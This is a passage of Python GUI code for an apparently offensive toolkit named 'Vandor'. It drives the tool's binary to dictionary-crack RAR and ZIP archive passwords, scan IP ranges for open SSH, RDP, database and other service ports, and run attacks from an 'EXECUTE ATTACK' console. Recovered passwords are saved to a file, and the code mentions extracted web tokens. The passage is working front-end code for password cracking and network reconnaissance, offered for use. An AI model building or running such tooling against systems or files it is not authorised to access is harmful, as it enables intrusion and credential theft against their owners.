        self.web_out.insert(0, "web_success.txt")

        self.web_fail = ctk.CTkEntry(output_frame, placeholder_text="Failed output (-web-fail)", height=30)
        self.web_fail.pack(fill="x", padx=10, pady=3)
        self.web_fail.insert(0, "web_failed.txt")

        self.web_tokens_out = ctk.CTkEntry(output_frame, placeholder_text="Tokens output (-web-tokens)", height=30)
        self.web_tokens_out.pack(fill="x", padx=10, pady=3)
        self.web_tokens_out.insert(0, "extracted_tokens.txt")

    def setup_archive_cracker_tab(self):
        main_frame = ctk.CTkScrollableFrame(self.tab_archive, corner_radius=15)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        left_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10), pady=10)

        right_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        right_frame.pack(side="right", fill="both", expand=True, padx=(10, 0), pady=10)

        ctk.CTkLabel(left_frame, text="📦 RAR / ZIP PASSWORD CRACKER", font=ctk.CTkFont(size=20, weight="bold"), text_color="#ff6b6b").pack(pady=15)

        rar_frame = ctk.CTkFrame(left_frame, corner_radius=10, fg_color="#1a1a1a")
        rar_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(rar_frame, text="🔐 RAR CRACKER", font=ctk.CTkFont(size=16, weight="bold"), text_color="#ffaa00").pack(pady=5)

        self.rar_file_frame = ctk.CTkFrame(rar_frame, fg_color="transparent")
        self.rar_file_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(self.rar_file_frame, text="RAR File:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.rar_file = ctk.CTkEntry(self.rar_file_frame, placeholder_text="target.rar", height=35)
        self.rar_file.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.rar_file_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.rar_file, ".rar")).pack(side="right", padx=(5, 0))

        self.rar_dict_frame = ctk.CTkFrame(rar_frame, fg_color="transparent")
        self.rar_dict_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(self.rar_dict_frame, text="Dictionary:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.rar_dict = ctk.CTkEntry(self.rar_dict_frame, placeholder_text="passwords.txt", height=35)
        self.rar_dict.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.rar_dict_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.rar_dict, ".txt")).pack(side="right", padx=(5, 0))

        rar_options_frame = ctk.CTkFrame(rar_frame, fg_color="transparent")
        rar_options_frame.pack(fill="x", padx=10, pady=5)

        ctk.CTkLabel(rar_options_frame, text="Workers:", font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 5))
        self.rar_workers = ctk.CTkEntry(rar_options_frame, placeholder_text="500", width=80, height=30)
        self.rar_workers.pack(side="left", padx=(0, 20))
        self.rar_workers.insert(0, "500")

        ctk.CTkLabel(rar_options_frame, text="Buffer Size:", font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 5))
        self.rar_buffer = ctk.CTkEntry(rar_options_frame, placeholder_text="10000", width=80, height=30)
        self.rar_buffer.pack(side="left")
        self.rar_buffer.insert(0, "10000")

        zip_frame = ctk.CTkFrame(left_frame, corner_radius=10, fg_color="#1a1a1a")
        zip_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(zip_frame, text="📦 ZIP CRACKER", font=ctk.CTkFont(size=16, weight="bold"), text_color="#ffaa00").pack(pady=5)

        self.zip_file_frame = ctk.CTkFrame(zip_frame, fg_color="transparent")
        self.zip_file_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(self.zip_file_frame, text="ZIP File:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.zip_file = ctk.CTkEntry(self.zip_file_frame, placeholder_text="target.zip", height=35)
        self.zip_file.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.zip_file_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.zip_file, ".zip")).pack(side="right", padx=(5, 0))

        self.zip_dict_frame = ctk.CTkFrame(zip_frame, fg_color="transparent")
        self.zip_dict_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(self.zip_dict_frame, text="Dictionary:", width=80, font=ctk.CTkFont(size=13)).pack(side="left")
        self.zip_dict = ctk.CTkEntry(self.zip_dict_frame, placeholder_text="passwords.txt", height=35)
        self.zip_dict.pack(side="left", fill="x", expand=True, padx=(10, 0))
        ctk.CTkButton(self.zip_dict_frame, text="📂", width=45, height=35, command=lambda: self.open_file_dialog(self.zip_dict, ".txt")).pack(side="right", padx=(5, 0))

        zip_options_frame = ctk.CTkFrame(zip_frame, fg_color="transparent")
        zip_options_frame.pack(fill="x", padx=10, pady=5)

        ctk.CTkLabel(zip_options_frame, text="Workers:", font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 5))
        self.zip_workers = ctk.CTkEntry(zip_options_frame, placeholder_text="500", width=80, height=30)
        self.zip_workers.pack(side="left", padx=(0, 20))
        self.zip_workers.insert(0, "500")

        ctk.CTkLabel(zip_options_frame, text="Buffer Size:", font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 5))
        self.zip_buffer = ctk.CTkEntry(zip_options_frame, placeholder_text="10000", width=80, height=30)
        self.zip_buffer.pack(side="left")
        self.zip_buffer.insert(0, "10000")

        button_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        button_frame.pack(fill="x", padx=15, pady=15)

        self.start_rar_btn = ctk.CTkButton(
            button_frame,
            text="🔓 CRACK RAR",
            command=self.run_rar_crack,
            fg_color="#8b0000",
            hover_color="#ff0000",
            height=40,
            font=ctk.CTkFont(size=14, weight="bold")
        )
        self.start_rar_btn.pack(side="left", padx=(0, 10), fill="x", expand=True)

        self.start_zip_btn = ctk.CTkButton(
            button_frame,
            text="🔓 CRACK ZIP",
            command=self.run_zip_crack,
            fg_color="#0066cc",
            hover_color="#0099ff",
            height=40,
            font=ctk.CTkFont(size=14, weight="bold")
        )
        self.start_zip_btn.pack(side="left", padx=(10, 0), fill="x", expand=True)

        ctk.CTkLabel(right_frame, text="📋 CRACK RESULTS", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ff6b6b").pack(pady=10)

        self.archive_results = ctk.CTkTextbox(right_frame, height=500, font=ctk.CTkFont(size=12, family="Consolas"))
        self.archive_results.pack(pady=10, padx=15, fill="both", expand=True)

        status_frame = ctk.CTkFrame(right_frame, fg_color="transparent", height=30)
        status_frame.pack(fill="x", padx=15, pady=(0, 10))
        
        self.archive_status = ctk.CTkLabel(status_frame, text="Ready", font=ctk.CTkFont(size=12), text_color="#888888")
        self.archive_status.pack(side="left")
        
        self.archive_found = ctk.CTkLabel(status_frame, text="", font=ctk.CTkFont(size=12, weight="bold"), text_color="#00ff00")
        self.archive_found.pack(side="right")

    def run_rar_crack(self):
        rar_file = self.rar_file.get().strip()
        if not rar_file:
            self.archive_results.insert("end", "[ERROR] Please select a RAR file\n")
            return

        rar_dict = self.rar_dict.get().strip()
        if not rar_dict:
            self.archive_results.insert("end", "[ERROR] Please select a dictionary file\n")
            return

        if not os.path.exists(rar_file):
            self.archive_results.insert("end", f"[ERROR] RAR file not found: {rar_file}\n")
            return

        if not os.path.exists(rar_dict):
            self.archive_results.insert("end", f"[ERROR] Dictionary file not found: {rar_dict}\n")
            return

        self.archive_results.delete("1.0", "end")
        self.archive_results.insert("end", "="*70 + "\n")
        self.archive_results.insert("end", "[*] CRACKING RAR FILE\n")
        self.archive_results.insert("end", f"[*] Target: {rar_file}\n")
        self.archive_results.insert("end", f"[*] Dictionary: {rar_dict}\n")
        self.archive_results.insert("end", "="*70 + "\n\n")

        self.archive_status.configure(text="Cracking RAR...", text_color="#ffaa00")
        self.start_rar_btn.configure(state="disabled")
        self.archive_found.configure(text="", text_color="#00ff00")

        cmd = ["./Vandor" if os.path.exists("./Vandor") else "Vandor"]
        cmd.extend(["-rar", rar_file])
        cmd.extend(["-rar-dict", rar_dict])

        if self.rar_workers.get().strip():
            cmd.extend(["-rar-workers", self.rar_workers.get().strip()])
        if self.rar_buffer.get().strip():
            cmd.extend(["-rar-buffer", self.rar_buffer.get().strip()])

        self.archive_results.insert("end", f"[CMD] {' '.join(cmd)}\n\n")
        self.archive_results.insert("end", "[*] Starting RAR cracker...\n\n")

        def crack_thread():
            found_password = None
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    bufsize=0
                )
                
                for line in iter(process.stdout.readline, b''):
                    if line:
                        try:
                            clean_line = line.decode('utf-8', errors='ignore')
                        except:
                            try:
                                clean_line = line.decode('cp1252', errors='ignore')
                            except:
                                clean_line = str(line)
                        
                        clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', clean_line)
                        clean_line = clean_line.strip()
                        
                        if clean_line and ("PASSWORD FOUND" in clean_line or "CRACKED" in clean_line or "password" in clean_line.lower()):
                            patterns = [
                                r'PASSWORD FOUND:\s*([^\s]+)',
                                r'PASSWORD FOUND\s*:\s*([^\s]+)',
                                r'CRACKED:\s*([^\s]+)',
                                r'CRACKED\s*:\s*([^\s]+)',
                                r'password[:\s]+([^\s]+)',
                                r'Password[:\s]+([^\s]+)',
                                r'PASSWORD[:\s]+([^\s]+)',
                                r'found[:\s]+([^\s]+)',
                            ]
                            
                            for pattern in patterns:
                                match = re.search(pattern, clean_line, re.IGNORECASE)
                                if match:
                                    candidate = match.group(1)
                                    if len(candidate) >= 2 and candidate != "s" and candidate != "S":
                                        found_password = candidate
                                        break
                            
                            if not found_password:
                                words = clean_line.split()
                                for w in words:
                                    if len(w) >= 4 and not w.isdigit() and w.lower() not in ['password', 'found', 'cracked', 'success', 'failed']:
                                        found_password = w
                                        break
                
                process.wait()
                
                if found_password and len(found_password) >= 2 and found_password != "s":
                    self.archive_results.delete("1.0", "end")
                    self.archive_results.insert("end", "\n" + "█"*70 + "\n")
                    self.archive_results.insert("end", "🎉 PASSWORD FOUND! 🎉\n")
                    self.archive_results.insert("end", f" 📁 File     : {os.path.basename(rar_file):<52}\n")
                    self.archive_results.insert("end", f" 🔑 Password : {found_password:<52}\n")
                    self.archive_results.insert("end", "█"*70 + "\n\n")
                    self.archive_found.configure(text=f"🎉 PASSWORD: {found_password}", text_color="#00ff00")
                    
                    with open("cracked_passwords.txt", "a") as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] RAR: {rar_file} | Password: {found_password}\n")
                else:
                    self.archive_results.insert("end", "\n" + "█"*70 + "\n")
                    self.archive_results.insert("end","❌ PASSWORD NOT FOUND ❌\n")
                    self.archive_results.insert("end", "█"*70 + "\n\n")
                    self.archive_found.configure(text="❌ Password not found in dictionary", text_color="#ff0000")
                
            except Exception as e:
                self.archive_results.insert("end", f"[ERROR] {str(e)}\n")
            finally:
                self.after(0, lambda: self.start_rar_btn.configure(state="normal"))
                self.after(0, lambda: self.archive_status.configure(text="Ready", text_color="#888888"))

        threading.Thread(target=crack_thread, daemon=True).start()

    def run_zip_crack(self):
        zip_file = self.zip_file.get().strip()
        if not zip_file:
            self.archive_results.insert("end", "[ERROR] Please select a ZIP file\n")
            return

        zip_dict = self.zip_dict.get().strip()
        if not zip_dict:
            self.archive_results.insert("end", "[ERROR] Please select a dictionary file\n")
            return

        if not os.path.exists(zip_file):
            self.archive_results.insert("end", f"[ERROR] ZIP file not found: {zip_file}\n")
            return

        if not os.path.exists(zip_dict):
            self.archive_results.insert("end", f"[ERROR] Dictionary file not found: {zip_dict}\n")
            return

        self.archive_results.delete("1.0", "end")
        self.archive_results.insert("end", "="*70 + "\n")
        self.archive_results.insert("end", "[*] CRACKING ZIP FILE\n")
        self.archive_results.insert("end", f"[*] Target: {zip_file}\n")
        self.archive_results.insert("end", f"[*] Dictionary: {zip_dict}\n")
        self.archive_results.insert("end", "="*70 + "\n\n")

        self.archive_status.configure(text="Cracking ZIP...", text_color="#ffaa00")
        self.start_zip_btn.configure(state="disabled")
        self.archive_found.configure(text="", text_color="#00ff00")

        cmd = ["./Vandor" if os.path.exists("./Vandor") else "Vandor"]
        cmd.extend(["-zip", zip_file])
        cmd.extend(["-zip-dict", zip_dict])

        if self.zip_workers.get().strip():
            cmd.extend(["-zip-workers", self.zip_workers.get().strip()])
        if self.zip_buffer.get().strip():
            cmd.extend(["-zip-buffer", self.zip_buffer.get().strip()])

        self.archive_results.insert("end", f"[CMD] {' '.join(cmd)}\n\n")
        self.archive_results.insert("end", "[*] Starting ZIP cracker...\n\n")

        def crack_thread():
            found_password = None
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    bufsize=0
                )
                
                for line in iter(process.stdout.readline, b''):
                    if line:
                        try:
                            clean_line = line.decode('utf-8', errors='ignore')
                        except:
                            try:
                                clean_line = line.decode('cp1252', errors='ignore')
                            except:
                                clean_line = str(line)
                        
                        clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', clean_line)
                        clean_line = clean_line.strip()
                        
                        if clean_line and ("PASSWORD FOUND" in clean_line or "CRACKED" in clean_line or "password" in clean_line.lower()):
                            patterns = [
                                r'PASSWORD FOUND:\s*([^\s]+)',
                                r'PASSWORD FOUND\s*:\s*([^\s]+)',
                                r'CRACKED:\s*([^\s]+)',
                                r'CRACKED\s*:\s*([^\s]+)',
                                r'password[:\s]+([^\s]+)',
                                r'Password[:\s]+([^\s]+)',
                                r'PASSWORD[:\s]+([^\s]+)',
                                r'found[:\s]+([^\s]+)',
                            ]
                            
                            for pattern in patterns:
                                match = re.search(pattern, clean_line, re.IGNORECASE)
                                if match:
                                    candidate = match.group(1)
                                    if len(candidate) >= 2 and candidate != "s" and candidate != "S":
                                        found_password = candidate
                                        break
                            
                            if not found_password:
                                words = clean_line.split()
                                for w in words:
                                    if len(w) >= 4 and not w.isdigit() and w.lower() not in ['password', 'found', 'cracked', 'success', 'failed']:
                                        found_password = w
                                        break
                
                process.wait()
                
                if found_password and len(found_password) >= 2 and found_password != "s":
                    self.archive_results.delete("1.0", "end")
                    self.archive_results.insert("end", "\n" + "█"*70 + "\n")
                    self.archive_results.insert("end","🎉 PASSWORD FOUND! 🎉\n")
                    self.archive_results.insert("end", f" 📁 File     : {os.path.basename(zip_file):<52}\n")
                    self.archive_results.insert("end", f" 🔑 Password : {found_password:<52}\n")
                    self.archive_results.insert("end", "█"*70 + "\n\n")
                    self.archive_found.configure(text=f"🎉 PASSWORD: {found_password}", text_color="#00ff00")
                    
                    with open("cracked_passwords.txt", "a") as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ZIP: {zip_file} | Password: {found_password}\n")
                else:
                    self.archive_results.insert("end", "\n" + "█"*70 + "\n")
                    self.archive_results.insert("end","❌ PASSWORD NOT FOUND ❌\n")
                    self.archive_results.insert("end", "█"*70 + "\n\n")
                    self.archive_found.configure(text="❌ Password not found in dictionary", text_color="#ff0000")
                
            except Exception as e:
                self.archive_results.insert("end", f"[ERROR] {str(e)}\n")
            finally:
                self.after(0, lambda: self.start_zip_btn.configure(state="normal"))
                self.after(0, lambda: self.archive_status.configure(text="Ready", text_color="#888888"))

        threading.Thread(target=crack_thread, daemon=True).start()

    def setup_alive_scanner_tab(self):
        main_frame = ctk.CTkFrame(self.tab_alive, corner_radius=15)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        scan_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        scan_frame.pack(pady=20, padx=20, fill="both", expand=True)

        ctk.CTkLabel(scan_frame, text="💚 NETWORK ALIVE HOST SCANNER 💚", font=ctk.CTkFont(size=22, weight="bold"), text_color="#00ff00").pack(pady=20)

        input_frame = ctk.CTkFrame(scan_frame, fg_color="transparent")
        input_frame.pack(fill="x", padx=20, pady=10)

        ctk.CTkLabel(input_frame, text="Target Network:", font=ctk.CTkFont(size=14)).pack(side="left", padx=(0, 10))
        self.alive_target = ctk.CTkEntry(input_frame, placeholder_text="192.168.1.0/24 or 192.168.1.1-254 or file.txt or IP:port", width=400, height=40)
        self.alive_target.pack(side="left", padx=(0, 10), fill="x", expand=True)
        ctk.CTkButton(input_frame, text="📂", width=45, height=40, command=lambda: self.open_file_dialog(self.alive_target)).pack(side="right")

        proto_frame = ctk.CTkFrame(scan_frame, fg_color="transparent")
        proto_frame.pack(fill="x", padx=20, pady=10)

        ctk.CTkLabel(proto_frame, text="Protocol Detection:", font=ctk.CTkFont(size=13)).pack(side="left", padx=(0, 10))
        self.alive_proto = ctk.CTkComboBox(proto_frame, values=["auto", "ssh", "rdp", "ftp", "mysql", "smb", "telnet", "vnc", "http", "https", "custom"], width=120, height=35)
        self.alive_proto.pack(side="left", padx=(0, 10))
        self.alive_proto.set("auto")
        
        self.alive_custom_port = ctk.CTkEntry(proto_frame, placeholder_text="Custom Port", width=100, height=35)
        self.alive_custom_port.pack(side="left", padx=(0, 10))

        options_frame = ctk.CTkFrame(scan_frame, fg_color="transparent")
        options_frame.pack(fill="x", padx=20, pady=10)

        ctk.CTkLabel(options_frame, text="Timeout (sec):", font=ctk.CTkFont(size=13)).pack(side="left", padx=(0, 5))
        self.alive_timeout = ctk.CTkEntry(options_frame, placeholder_text="2", width=80, height=35)
        self.alive_timeout.pack(side="left", padx=(0, 20))
        self.alive_timeout.insert(0, "2")

        ctk.CTkLabel(options_frame, text="Threads:", font=ctk.CTkFont(size=13)).pack(side="left", padx=(0, 5))
        self.alive_threads = ctk.CTkEntry(options_frame, placeholder_text="200", width=80, height=35)
        self.alive_threads.pack(side="left", padx=(0, 20))
        self.alive_threads.insert(0, "200")

        self.alive_tcp = ctk.CTkCheckBox(options_frame, text="TCP Connect", font=ctk.CTkFont(size=13))
        self.alive_tcp.pack(side="left", padx=(0, 10))
        self.alive_tcp.select()

        self.alive_icmp = ctk.CTkCheckBox(options_frame, text="ICMP Ping", font=ctk.CTkFont(size=13))
        self.alive_icmp.pack(side="left")

        button_frame = ctk.CTkFrame(scan_frame, fg_color="transparent")
        button_frame.pack(fill="x", padx=20, pady=15)

        self.start_alive_btn = ctk.CTkButton(
            button_frame,
            text="🚀 START ALIVE SCAN",
            command=self.start_alive_scan,
            fg_color="#008b00",
            hover_color="#00aa00",
            height=45,
            font=ctk.CTkFont(size=15, weight="bold")
        )
        self.start_alive_btn.pack(side="left", padx=(0, 10), fill="x", expand=True)

        self.stop_alive_btn = ctk.CTkButton(
            button_frame,
            text="⏹ STOP SCAN",
            command=self.stop_alive_scan,
            fg_color="#8b0000",
            hover_color="#ff0000",
            height=45,
            font=ctk.CTkFont(size=15, weight="bold"),
            state="disabled"
        )
        self.stop_alive_btn.pack(side="left", padx=(10, 0), fill="x", expand=True)

        self.alive_results = ctk.CTkTextbox(scan_frame, height=350, font=ctk.CTkFont(size=12, family="Consolas"))
        self.alive_results.pack(pady=10, padx=20, fill="both", expand=True)

        status_frame = ctk.CTkFrame(scan_frame, fg_color="transparent", height=30)
        status_frame.pack(fill="x", padx=20, pady=(0, 10))
        
        self.alive_status = ctk.CTkLabel(status_frame, text="Ready", font=ctk.CTkFont(size=12), text_color="#888888")
        self.alive_status.pack(side="left")
        
        self.alive_found = ctk.CTkLabel(status_frame, text="Found: 0 hosts", font=ctk.CTkFont(size=12, weight="bold"), text_color="#00ff00")
        self.alive_found.pack(side="right")

    def start_alive_scan(self):
        target_input = self.alive_target.get().strip()
        if not target_input:
            self.alive_results.insert("end", "[ERROR] Please enter target network or IP range\n")
            return

        self.alive_scan_stop = False
        self.start_alive_btn.configure(state="disabled")
        self.stop_alive_btn.configure(state="normal")
        self.alive_results.delete("1.0", "end")
        
        timeout = int(self.alive_timeout.get()) if self.alive_timeout.get().isdigit() else 2
        threads = int(self.alive_threads.get()) if self.alive_threads.get().isdigit() else 200
        
        protocol = self.alive_proto.get().lower()
        custom_port = self.alive_custom_port.get().strip()
        
        if custom_port and custom_port.isdigit():
            scan_port = custom_port
        elif protocol != "auto" and protocol != "custom":
            scan_port = str(self.get_port_for_protocol(protocol))
        else:
            scan_port = "21,22,23,25,110,143,161,389,993,995,1433,3306,3389,5432,5900,6379,8080,8443,27017"
        
        vandor_path = shutil.which("Vandor")
        if not vandor_path:
            local_exe = os.path.join(os.getcwd(), "Vandor.exe") if os.name == 'nt' else os.path.join(os.getcwd(), "Vandor")
            if os.path.exists(local_exe):
                vandor_path = local_exe
        
        if not vandor_path:
            self.alive_results.insert("end", "[ERROR] Vandor not found! Please install first.\n")
            self.start_alive_btn.configure(state="normal")
            self.stop_alive_btn.configure(state="disabled")
            return
        
        cmd = [vandor_path, "-hs", target_input, "-ps", scan_port, "-t", str(timeout), "-threads", str(threads), "-skip-alive"]
        
        self.alive_results.insert("end", "="*70 + "\n")
        self.alive_results.insert("end", f"[*] SCANNING: {target_input}\n")
        self.alive_results.insert("end", f"[*] Command: {' '.join(cmd)}\n")
        self.alive_results.insert("end", "="*70 + "\n\n")
        self.alive_status.configure(text="Scanning...", text_color="#ffaa00")
        
        def scan_thread():
            try:
                self.scan_process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=False,
                    bufsize=0
                )
                
                for line in iter(self.scan_process.stdout.readline, b''):
                    if self.alive_scan_stop:
                        self.scan_process.terminate()
                        break
                    if line:
                        try:
                            decoded = line.decode('cp850', errors='replace')
                            clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', decoded)
                            self.alive_results.insert("end", clean_line)
                            self.alive_results.see("end")
                            
                            match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+) OPEN', clean_line)
                            if match:
                                host, port = match.groups()
                                self.alive_found.configure(text=f"Found: {host}:{port}")
                        except:
                            pass
                
                self.scan_process.wait()
                
                if not self.alive_scan_stop:
                    self.alive_results.insert("end", "\n" + "="*70 + "\n")
                    self.alive_results.insert("end", "[✓] SCAN COMPLETED\n")
                    self.alive_status.configure(text="Ready", text_color="#00ff00")
                else:
                    self.alive_results.insert("end", "\n[!] Scan stopped by user\n")
                    self.alive_status.configure(text="Stopped", text_color="#ff0000")
                    
            except Exception as e:
                self.alive_results.insert("end", f"[ERROR] {str(e)}\n")
            finally:
                self.after(0, lambda: self.start_alive_btn.configure(state="normal"))
                self.after(0, lambda: self.stop_alive_btn.configure(state="disabled"))
                self.scan_process = None
        
        threading.Thread(target=scan_thread, daemon=True).start()

    def stop_alive_scan(self):
        self.alive_scan_stop = True
        self.alive_status.configure(text="Stopping...", text_color="#ff0000")
        self.alive_results.insert("end", "\n[!] Scan stopped by user\n")
        self.start_alive_btn.configure(state="normal")
        self.stop_alive_btn.configure(state="disabled")
        self.alive_status.configure(text="Stopped", text_color="#ff0000")

    def setup_install_tab(self):
        main_frame = ctk.CTkFrame(self.tab_install, corner_radius=15)
        main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        install_frame = ctk.CTkFrame(main_frame, corner_radius=12)
        install_frame.pack(pady=30, padx=30, fill="both", expand=True)

        ctk.CTkLabel(
            install_frame, 
            text="⚡ VANDOR INSTALLATION MANAGER ⚡", 
            font=ctk.CTkFont(size=26, weight="bold"),
            text_color="#ff3e3e"
        ).pack(pady=30)

        self.install_status = ctk.CTkLabel(
            install_frame, 
            text="🔍 Checking Vandor installation...", 
            font=ctk.CTkFont(size=15),
            text_color="#ffaa00"
        )
        self.install_status.pack(pady=20)

        install_cmd = 'go install -ldflags="-s -w" Vandor@2.0.5'
        
        cmd_frame = ctk.CTkFrame(install_frame, fg_color="#1a1a1a", corner_radius=8)
        cmd_frame.pack(pady=10, padx=20, fill="x")
        
        ctk.CTkLabel(
            cmd_frame, 
            text=f"$ {install_cmd}", 
            font=ctk.CTkFont(size=14, family="Consolas"),
            text_color="#00ff00"
        ).pack(pady=12, padx=10)

        self.install_btn = ctk.CTkButton(
            install_frame,
            text="📦 INSTALL / UPDATE VANDOR",
            command=self.install_vandor,
            fg_color="#8b0000",
            hover_color="#ff0000",
            height=55,
            font=ctk.CTkFont(size=17, weight="bold")
        )
        self.install_btn.pack(pady=20, padx=30, fill="x")

        self.local_status = ctk.CTkLabel(
            install_frame, 
            text="", 
            font=ctk.CTkFont(size=13),
            text_color="#888888"
        )
        self.local_status.pack(pady=10)

        local_check_btn = ctk.CTkButton(
            install_frame,
            text="🔍 CHECK LOCAL Vandor.exe",
            command=self.check_local_vandor,
            fg_color="#2d2d2d",
            hover_color="#3d3d3d",
            height=40
        )
        local_check_btn.pack(pady=5, padx=30, fill="x")

        go_path = os.path.expanduser("~/go/bin/Vandor")
        if os.name == 'nt':
            go_path = os.path.expanduser("~/go/bin/Vandor.exe")
        self.go_bin_path = go_path

    def setup_output_tab(self):
        self.output_frame = ctk.CTkFrame(self.tab_output, corner_radius=12)
        self.output_frame.pack(fill="both", expand=True, padx=15, pady=15)

        self.output_text = ctk.CTkTextbox(
            self.output_frame, 
            wrap="word", 
            font=ctk.CTkFont(size=12, family="Consolas"),
            fg_color="#0a0a0a"
        )
        self.output_text.pack(fill="both", expand=True)

        btn_frame = ctk.CTkFrame(self.output_frame, fg_color="transparent", height=50)
        btn_frame.pack(fill="x", pady=(10, 0))

        self.run_btn = ctk.CTkButton(
            btn_frame, 
            text="▶ EXECUTE ATTACK", 
            command=self.run_attack,
            fg_color="#00aa00",
            hover_color="#00ff00",
            height=45,
            font=ctk.CTkFont(size=15, weight="bold")
        )
        self.run_btn.pack(side="left", padx=5, fill="x", expand=True)

        self.kill_btn = ctk.CTkButton(
            btn_frame, 
            text="⏹ TERMINATE", 
            command=self.kill_process,
            fg_color="#8b0000",
            hover_color="#ff0000",
            height=45,
            font=ctk.CTkFont(size=15, weight="bold")
        )
        self.kill_btn.pack(side="left", padx=5, fill="x", expand=True)

        self.clear_btn = ctk.CTkButton(
            btn_frame, 
            text="🗑 CLEAR CONSOLE", 
            command=self.clear_output,
            fg_color="#2d2d2d",
            hover_color="#3d3d3d",
            height=45,
            font=ctk.CTkFont(size=15, weight="bold")
        )
        self.clear_btn.pack(side="left", padx=5, fill="x", expand=True)

    def open_file_dialog(self, entry_widget, file_ext=""):
        if file_ext:
            filename = filedialog.askopenfilename(
                title="Select File",
                filetypes=[(f"{file_ext.upper()} files", f"*{file_ext}"), ("All files", "*.*")]
            )
        else:
            filename = filedialog.askopenfilename(
                title="Select File",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
        if filename:
            entry_widget.delete(0, "end")
            entry_widget.insert(0, filename)

    def load_preset(self, proto, user, pwd, port):
        self.basic_proto.set(proto)
        self.basic_user.delete(0, "end")
        self.basic_user.insert(0, user)
        self.basic_pass.delete(0, "end")
        if pwd:
            self.basic_pass.insert(0, pwd)
        if port:
            self.basic_port.delete(0, "end")
            self.basic_port.insert(0, port)

    def check_vandor_installation(self):
        vandor_path = shutil.which("Vandor")
        if not vandor_path:
            go_path = os.path.expanduser("~/go/bin/Vandor")
            if os.name == 'nt':
                go_path = os.path.expanduser("~/go/bin/Vandor.exe")
            if os.path.exists(go_path):
                vandor_path = go_path
        
        if vandor_path and os.path.exists(vandor_path):
            self.install_status.configure(text="✅ Vandor is INSTALLED and READY", text_color="#00ff00")
            self.status_label.configure(text="● VANDOR READY", text_color="#00ff00")
        else:
            self.install_status.configure(text="❌ Vandor NOT FOUND - Click INSTALL to install", text_color="#ff0000")
            self.status_label.configure(text="● VANDOR MISSING", text_color="#ff0000")

    def check_local_vandor(self):
        current_dir = os.getcwd()
        vandor_exe = os.path.join(current_dir, "Vandor")
        if os.name == 'nt':
            vandor_exe = os.path.join(current_dir, "Vandor.exe")
        
        if os.path.exists(vandor_exe):
            self.local_status.configure(text=f"✅ Found: {vandor_exe}", text_color="#00ff00")
        else:
            self.local_status.configure(text=f"❌ Vandor.exe not found in {current_dir}", text_color="#ff0000")

    def install_vandor(self):
        self.install_btn.configure(state="disabled", text="📦 INSTALLING...")
        self.log_install("[*] Installing Vandor via go install...")
        
        def install_thread():
            try:
                process = subprocess.Popen(
                    ["go", "install", '-ldflags="-s -w"',"Vandor@2.0.5"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                for line in iter(process.stdout.readline, ''):
                    if line:
                        self.log_install(line.strip())
                
                process.wait()
                
                if process.returncode == 0:
                    self.log_install("[✓] Vandor installed successfully!")
                    self.after(0, lambda: self.install_status.configure(text="✅ Vandor INSTALLED", text_color="#00ff00"))
                    self.after(0, self.check_vandor_installation)
                else:
                    error = process.stderr.read()
                    self.log_install(f"[✗] Installation failed: {error}")
                    self.after(0, lambda: self.install_status.configure(text="❌ Installation failed", text_color="#ff0000"))
                    
            except Exception as e:
                self.log_install(f"[✗] Error: {str(e)}")
            finally:
                self.after(0, lambda: self.install_btn.configure(state="normal", text="📦 INSTALL / UPDATE VANDOR"))
        
        threading.Thread(target=install_thread, daemon=True).start()

    def log_install(self, message):
        if hasattr(self, 'output_text'):
            self.output_text.insert("end", f"[INSTALL] {message}\n")
            self.output_text.see("end")

    def log(self, message):
        self.output_text.insert("end", message + "\n")
        self.output_text.see("end")
        self.update_idletasks()

    def clear_output(self):
        self.output_text.delete("1.0", "end")

    def kill_process(self):
        if self.process and self.process.poll() is None:
            self.log("[!] TERMINATING PROCESS...")
            try:
                parent = psutil.Process(self.process.pid)
                for child in parent.children(recursive=True):
                    child.kill()
                parent.kill()
                self.log("[✓] Process terminated successfully")
            except Exception as e:
                try:
                    self.process.terminate()
                    self.log("[✓] Process terminated")
                except:
                    self.log(f"[!] Could not terminate: {str(e)}")
            self.process = None
            self.status_label.configure(text="● PROCESS KILLED", text_color="#ffaa00")
